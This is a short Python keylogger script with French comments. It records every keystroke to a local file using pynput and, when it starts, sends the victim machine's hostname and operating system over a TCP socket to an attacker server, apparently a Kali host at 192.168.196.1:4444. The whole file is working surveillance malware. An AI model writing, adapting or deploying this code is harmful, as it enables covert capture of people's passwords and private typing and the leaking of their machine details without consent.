from pynput.keyboard import Listener
import socket
import json
import platform
import socket as s 
import os

# Adresse et port du serveur (Kali)
SERVER_IP = "192.168.196.1"
SERVER_PORT = 4444

# Fichier pour sauvegarder les frappes
LOG_FILE = "keylogs.txt" 

if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("=== Keylogger Logs ===\n\n")

# Fonction pour envoyer des données au serveur
def send_data(data):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))

        payload = json.dumps(data)
        client_socket.send(payload.encode('utf-8'))
        client_socket.close()
    except Exception as e:
        print(f"Erreur lors de l'envoi : {e}")

# Fonction pour envoyer les informations sur la cible
def send_target_info():
    try:
        target_info = {
            "type": "target_info",
            "hostname": s.gethostname(),
            "os": platform.system() + " " + platform.release(),
        }
        send_data(target_info)
        print("Informations sur la cible envoyées.")
    except Exception as e:
        print(f"Erreur lors de l'envoi des informations sur la cible : {e}")

# Fonction pour capturer les frappes de clavier
def log_keystroke(key):
    key = str(key).replace("'", "") 

    # Sauvegarder dans le fichier
    with open(LOG_FILE, "a") as f:
        f.write(f"{key}\n")

send_target_info()

# Lancer l'écouteur pour les frappes clavier
with Listener(on_press=log_keystroke) as listener:
    listener.join()
